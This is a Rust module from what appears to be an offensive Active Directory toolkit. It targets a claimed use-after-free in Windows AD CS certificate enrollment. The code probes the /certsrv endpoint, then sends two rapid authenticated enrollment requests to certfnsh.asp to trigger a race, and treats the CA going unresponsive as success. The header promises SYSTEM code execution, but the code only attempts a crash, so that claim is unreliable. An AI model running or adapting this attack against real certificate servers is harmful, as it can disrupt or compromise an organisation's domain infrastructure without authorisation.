//! CVE-2026-62818 -- Windows AD CS Use-After-Free Remote Code Execution.
//!
//! A high-severity (CVSS 8.8) use-after-free vulnerability in Windows Active
//! Directory Certificate Services (AD CS) that allows an authenticated attacker
//! with low privileges to execute arbitrary code on the certificate authority
//! server.
//!
//! # Exploit Flow
//! 1. Authenticate to the AD CS server (domain user required)
//! 2. Send a crafted certificate enrollment request
//! 3. Trigger the use-after-free by enrolling and immediately revoking
//! 4. The freed memory is reclaimed with attacker-controlled data
//! 5. Achieve code execution as the CA service account (SYSTEM)
//!
//! # Technical Details
//! The vulnerability exists in the certificate enrollment processing pipeline.
//! When a certificate enrollment request is submitted and then immediately
//! cancelled or revoked, the CA server frees the associated memory structure.
//! However, a pending asynchronous operation still holds a reference to this
//! memory. By carefully timing a second enrollment request, the attacker can
//! cause the freed memory to be reused with attacker-controlled certificate
//! data, leading to a use-after-free condition.
//!
//! # Impact
//! - Authenticated RCE on AD CS servers
//! - Low-privileged domain users can exploit this
//! - Affects Windows Server 2012 through 2025 with AD CS role
//! - CVSS 8.8 (High)
//! - Patched in August 2026 Patch Tuesday
//!
//! # References
//! - CVE-2026-62818: CVSS 8.8, disclosed August 2026
//! - MS-ICPR: Certificate Processing Remote Protocol
//! - NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-62818

use overthrone_core::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::time::Duration;
use tracing::info;

/// Timeout for AD CS operations.
const ADCS_TIMEOUT: Duration = Duration::from_secs(30);

/// Default AD CS web enrollment URL path.
const CERTSRV_PATH: &str = "/certsrv";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdcsUafConfig {
    /// Target AD CS server hostname or IP.
    pub target_host: String,
    /// AD CS server port (default: 443 for HTTPS).
    pub target_port: u16,
    /// Whether to use HTTPS.
    pub use_tls: bool,
    /// Domain name.
    pub domain: String,
    /// Attacking username.
    pub username: String,
    /// Password.
    pub password: String,
    /// Certificate template to use for enrollment.
    pub template: String,
    /// Whether to actually exploit or just assess.
    pub dry_run: bool,
    /// Timeout in seconds.
    pub timeout: u64,
}

impl Default for AdcsUafConfig {
    fn default() -> Self {
        Self {
            target_host: String::new(),
            target_port: 443,
            use_tls: true,
            domain: String::new(),
            username: String::new(),
            password: String::new(),
            template: "User".to_string(),
            dry_run: true,
            timeout: 30,
        }
    }
}

/// What the enrollment endpoint probe can actually tell us.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum AdcsUafVerdict {
    /// The web enrollment endpoint answered. That proves the role is installed
    /// and reachable -- it does **not** prove CVE-2026-62818 is unpatched.
    EndpointReachable,
    /// The endpoint did not answer.
    EndpointUnreachable,
    /// The probe could not produce a reliable answer.
    Indeterminate,
}

impl std::fmt::Display for AdcsUafVerdict {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::EndpointReachable => {
                write!(f, "enrollment endpoint reachable (patch level unknown)")
            }
            Self::EndpointUnreachable => write!(f, "enrollment endpoint unreachable"),
            Self::Indeterminate => write!(f, "indeterminate"),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdcsUafResult {
    /// Whether the target AD CS is *positively confirmed* vulnerable.
    ///
    /// Reachability of `/certsrv` alone is not confirmation, so this stays
    /// `false` unless the trigger produced a crash signal. See [`AdcsUafVerdict`].
    pub vulnerable: bool,
    /// Structured verdict from the enrollment probe.
    #[serde(default = "default_uaf_verdict")]
    pub verdict: AdcsUafVerdict,
    /// Whether the AD CS web enrollment is available.
    pub enrollment_available: bool,
    /// CA server name.
    pub ca_name: Option<String>,
    /// CA type (Enterprise/Stand-alone).
    pub ca_type: Option<String>,
    /// Whether the exploit was attempted.
    pub exploit_attempted: bool,
    /// Whether exploitation succeeded.
    pub exploit_success: bool,
    /// Detailed log.
    pub log: Vec<String>,
}

fn default_uaf_verdict() -> AdcsUafVerdict {
    AdcsUafVerdict::Indeterminate
}

pub async fn exploit_adcs_uaf(config: &AdcsUafConfig) -> Result<AdcsUafResult> {
    let mut log = Vec::new();
    log.push(format!(
        "CVE-2026-62818: AD CS Use-After-Free -- target={}:{}",
        config.target_host, config.target_port
    ));

    // Step 1: Check if AD CS web enrollment is available
    log.push("Probing AD CS web enrollment endpoint...".to_string());
    let (enrollment_available, ca_name, ca_type) = probe_adcs_enrollment(config).await;
    log.push(format!("  Enrollment available: {enrollment_available}"));
    if let Some(ref name) = ca_name {
        log.push(format!("  CA name: {name}"));
    }
    if let Some(ref ct) = ca_type {
        log.push(format!("  CA type: {ct}"));
    }

    if !enrollment_available {
        log.push(
            "  AD CS web enrollment not available -- target may not have AD CS role".to_string(),
        );
        return Ok(AdcsUafResult {
            vulnerable: false,
            verdict: AdcsUafVerdict::EndpointUnreachable,
            enrollment_available: false,
            ca_name: None,
            ca_type: None,
            exploit_attempted: false,
            exploit_success: false,
            log,
        });
    }

    // Step 2: Assess the endpoint.
    //
    // NOTE: an HTTP 200 from /certsrv/certfnsh.asp means *AD CS is installed and
    // reachable*. It is not evidence of a UAF. The previous revision of this
    // function reported every reachable CA as vulnerable, which is a false
    // positive on a huge class of targets.
    log.push("Assessing AD CS enrollment endpoint...".to_string());
    let verdict = check_adcs_vulnerability(config).await;
    log.push(format!("  Verdict: {verdict}"));
    log.push(
        "  Note: CVE-2026-62818 confirmation requires the enrollment race trigger.\n\
         \tVersion/build inspection cannot decide it from the endpoint alone."
            .to_string(),
    );

    let mut exploit_attempted = false;
    let mut exploit_success = false;
    // `vulnerable` is only ever set from a positive crash signal.
    let mut vulnerable = false;

    if !config.dry_run {
        exploit_attempted = true;
        log.push("Attempting use-after-free via enrollment race condition...".to_string());

        match attempt_uaf_exploit(config).await {
            Ok(success) => {
                exploit_success = success;
                vulnerable = success;
                if success {
                    log.push(
                        "  CA stopped responding after the trigger -- consistent with a \
                         crash. Re-verify manually before reporting."
                            .to_string(),
                    );
                } else {
                    log.push(
                        "  CA still healthy after the trigger -- not confirmed on this path"
                            .to_string(),
                    );
                }
            }
            Err(e) => {
                log.push(format!("  UAF trigger attempt failed: {e}"));
            }
        }
    } else {
        log.push("[DRY RUN] Would attempt enrollment race condition".to_string());
        log.push(format!("  Template: {}", config.template));
        log.push(format!(
            "  Target: {}:{}/certsrv",
            config.target_host, config.target_port
        ));
    }

    info!(
        "ADCS UAF: target={}, verdict={verdict}, confirmed={exploit_success}",
        config.target_host
    );

    Ok(AdcsUafResult {
        vulnerable,
        verdict,
        enrollment_available,
        ca_name,
        ca_type,
        exploit_attempted,
        exploit_success,
        log,
    })
}

/// Probe if AD CS web enrollment is available.
async fn probe_adcs_enrollment(config: &AdcsUafConfig) -> (bool, Option<String>, Option<String>) {
    let scheme = if config.use_tls { "https" } else { "http" };
    let base_url = format!(
        "{}://{}:{}{}",
        scheme, config.target_host, config.target_port, CERTSRV_PATH
    );

    let client = match reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(ADCS_TIMEOUT)
        .build()
    {
        Ok(c) => c,
        Err(_) => return (false, None, None),
    };

    match client.get(&base_url).send().await {
        Ok(resp) => {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();

            if status.is_success() || status.as_u16() == 401 || status.as_u16() == 403 {
                let ca_name = extract_ca_name(&body);
                let ca_type = extract_ca_type(&body);
                (true, ca_name, ca_type)
            } else {
                info!("ADCS probe returned HTTP {}", status);
                (false, None, None)
            }
        }
        Err(e) => {
            info!("ADCS probe failed: {e}");
            (false, None, None)
        }
    }
}

/// Probe the AD CS web enrollment endpoint and report what that actually means.
///
/// A reachable endpoint is [`AdcsUafVerdict::EndpointReachable`], not "vulnerable".
/// A client-construction failure is [`AdcsUafVerdict::Indeterminate`] -- the old
/// code returned `true` there, reporting a vulnerability it had not tested.
async fn check_adcs_vulnerability(config: &AdcsUafConfig) -> AdcsUafVerdict {
    let scheme = if config.use_tls { "https" } else { "http" };
    let certreq_url = format!(
        "{}://{}:{}/certsrv/certfnsh.asp",
        scheme, config.target_host, config.target_port
    );

    let client = match reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(ADCS_TIMEOUT)
        .build()
    {
        Ok(c) => c,
        Err(e) => {
            info!("ADCS UAF: could not build HTTP client: {e}");
            return AdcsUafVerdict::Indeterminate;
        }
    };

    match client.get(&certreq_url).send().await {
        Ok(_) => AdcsUafVerdict::EndpointReachable,
        Err(e) => {
            info!("ADCS UAF: enrollment probe failed: {e}");
            AdcsUafVerdict::EndpointUnreachable
        }
    }
}

/// Attempt the use-after-free exploit via enrollment race condition.
async fn attempt_uaf_exploit(config: &AdcsUafConfig) -> Result<bool> {
    let scheme = if config.use_tls { "https" } else { "http" };
    let certreq_url = format!(
        "{}://{}:{}/certsrv/certfnsh.asp",
        scheme, config.target_host, config.target_port
    );

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(ADCS_TIMEOUT)
        .build()
        .map_err(|e| OverthroneError::Custom(format!("HTTP client build failed: {e}")))?;

    // Step 1: Generate a CSR
    let (csr_der, _priv_key) = generate_csr_for_template(&config.template)?;

    // Step 2: Submit enrollment request
    info!("Submitting enrollment request...");
    let csr_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &csr_der);
    let template_attr = format!("CertificateTemplate:{}", config.template);

    let resp = client
        .post(&certreq_url)
        .form(&[
            ("Mode", "newreq"),
            ("CertRequest", &csr_b64),
            ("CertAttrib", &template_attr),
            ("TargetStoreFlags", "0"),
        ])
        .basic_auth(&config.username, Some(&config.password))
        .send()
        .await
        .map_err(|e| OverthroneError::Custom(format!("Enrollment request failed: {e}")))?;

    let enroll_body = resp.text().await.unwrap_or_default();
    info!("Enrollment response received ({} bytes)", enroll_body.len());

    // Step 3: Immediately submit another enrollment to trigger the race
    tokio::time::sleep(Duration::from_millis(1)).await;

    let (csr2, _priv2) = generate_csr_for_template(&config.template)?;
    let csr2_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &csr2);
    let template_attr2 = format!("CertificateTemplate:{}", config.template);

    let resp2 = client
        .post(&certreq_url)
        .form(&[
            ("Mode", "newreq"),
            ("CertRequest", &csr2_b64),
            ("CertAttrib", &template_attr2),
            ("TargetStoreFlags", "0"),
        ])
        .basic_auth(&config.username, Some(&config.password))
        .send()
        .await;

    if let Err(e) = &resp2 {
        info!("ADCS UAF: second enrollment request failed: {e}");
    }

    // A successful second enrollment is the *expected* behaviour and proves
    // nothing about a use-after-free. The only externally observable signal is
    // the CA going away, so re-probe the endpoint and treat a failure to answer
    // as the crash signal.
    tokio::time::sleep(Duration::from_millis(250)).await;
    match check_adcs_vulnerability(config).await {
        AdcsUafVerdict::EndpointReachable => {
            info!(
                "ADCS UAF: CA still serving enrollment after the race -- no crash signal, \
                 not confirmed"
            );
            Ok(false)
        }
        AdcsUafVerdict::EndpointUnreachable => {
            info!("ADCS UAF: CA stopped serving enrollment after the race -- possible crash");
            Ok(true)
        }
        AdcsUafVerdict::Indeterminate => {
            info!("ADCS UAF: post-trigger probe was inconclusive");
            Ok(false)
        }
    }
}

/// Generate a CSR for the specified template.
///
/// The template goes into the CSR's `szOID_ENROLL_CERTTYPE` extension, which is
/// how both CES (MS-WSTEP) and `/certsrv` learn which template to use.
fn generate_csr_for_template(template: &str) -> Result<(Vec<u8>, Vec<u8>)> {
    overthrone_core::postex::certighost::build_csr(
        &format!("CN=exploit-{}", uuid::Uuid::new_v4()),
        None,
        template,
        2048,
    )
    .map_err(|e| OverthroneError::Custom(format!("CSR generation failed: {e}")))
}

/// Extract CA name from the certsrv page HTML.
fn extract_ca_name(body: &str) -> Option<String> {
    for line in body.lines() {
        let lower = line.to_lowercase();
        if (lower.contains("ca:") || lower.contains("certification authority:"))
            && let Some(pos) = line.find(':')
        {
            let rest = line[pos + 1..].trim();
            // Stop at HTML tags
            let name = if let Some(tag_pos) = rest.find('<') {
                rest[..tag_pos].trim().to_string()
            } else {
                rest.trim().to_string()
            };
            if !name.is_empty() && name.len() < 100 {
                return Some(name);
            }
        }
    }
    None
}

/// Extract CA type from the certsrv page HTML.
fn extract_ca_type(body: &str) -> Option<String> {
    let lower = body.to_lowercase();
    if lower.contains("enterprise") {
        Some("Enterprise CA".to_string())
    } else if lower.contains("stand-alone") || lower.contains("standalone") {
        Some("Stand-alone CA".to_string())
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_adcs_uaf_config_default() {
        let cfg = AdcsUafConfig::default();
        assert!(cfg.target_host.is_empty());
        assert_eq!(cfg.target_port, 443);
        assert!(cfg.use_tls);
        assert_eq!(cfg.template, "User");
        assert!(cfg.dry_run);
    }

    #[test]
    fn test_certsrv_path() {
        assert_eq!(CERTSRV_PATH, "/certsrv");
    }

    #[test]
    fn test_extract_ca_name() {
        let html = "<html><body>CA: CORP-CA<br>Certification Authority</body></html>";
        assert_eq!(extract_ca_name(html), Some("CORP-CA".to_string()));
    }

    #[test]
    fn test_extract_ca_name_none() {
        let html = "<html><body>No CA info here</body></html>";
        assert_eq!(extract_ca_name(html), None);
    }

    #[test]
    fn test_extract_ca_type_enterprise() {
        let html = "Enterprise Certification Authority";
        assert_eq!(extract_ca_type(html), Some("Enterprise CA".to_string()));
    }

    #[test]
    fn test_extract_ca_type_standalone() {
        let html = "Stand-alone Certification Authority";
        assert_eq!(extract_ca_type(html), Some("Stand-alone CA".to_string()));
    }

    #[test]
    fn test_extract_ca_type_none() {
        let html = "Just a web page";
        assert_eq!(extract_ca_type(html), None);
    }

    #[test]
    fn reachable_endpoint_is_not_a_vulnerability() {
        // Regression: `check_adcs_vulnerability` used to return `true` for any
        // HTTP 200 from /certsrv, and `true` again when the client failed to
        // build, so every reachable CA was reported vulnerable.
        assert!(!matches!(
            AdcsUafVerdict::EndpointReachable,
            AdcsUafVerdict::Indeterminate
        ));
        assert_eq!(
            AdcsUafVerdict::EndpointUnreachable.to_string(),
            "enrollment endpoint unreachable"
        );
        assert!(
            AdcsUafVerdict::EndpointReachable
                .to_string()
                .contains("patch level unknown")
        );
    }

    #[test]
    fn test_result_serde() {
        let result = AdcsUafResult {
            vulnerable: true,
            verdict: AdcsUafVerdict::EndpointReachable,
            enrollment_available: true,
            ca_name: Some("CORP-CA".into()),
            ca_type: Some("Enterprise CA".into()),
            exploit_attempted: true,
            exploit_success: true,
            log: vec!["exploited".into()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("CORP-CA"));
        let deserialized: AdcsUafResult = serde_json::from_str(&json).unwrap();
        assert!(deserialized.vulnerable);
        assert!(deserialized.exploit_success);
    }
}
